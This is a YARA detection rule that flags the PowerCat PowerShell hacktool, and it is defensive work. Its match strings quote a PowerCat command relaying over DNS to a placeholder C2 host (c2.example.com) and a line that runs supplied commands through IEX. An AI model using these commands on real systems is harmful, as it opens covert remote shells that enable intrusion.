rule HKTL_PS1_PowerCat_Mar21
{
	meta:
		description = "Detects PowerCat hacktool"
		author = "Florian Roth (Nextron Systems)"
		reference = "https://github.com/besimorhino/powercat"
		date = "2021-03-02"
		hash1 = "c55672b5d2963969abe045fe75db52069d0300691d4f1f5923afeadf5353b9d2"
		os = "windows,linux"
		filetype = "script"

	strings:
		$x1 = "powercat -l -p 8000 -r dns:10.1.1.1:53:c2.example.com" ascii fullword
		$x2 = "try{[byte[]]$ReturnedData = $Encoding.GetBytes((IEX $CommandToExecute 2>&1 | Out-String))}" ascii fullword
		$s1 = "Returning Encoded Payload..." ascii
		$s2 = "$CommandToExecute =" ascii fullword
		$s3 = "[alias(\"Execute\")][string]$e=\"\"," ascii

	condition:
		uint16(0)==0x7566 and filesize <200KB and 1 of ($x*) or 3 of them
}
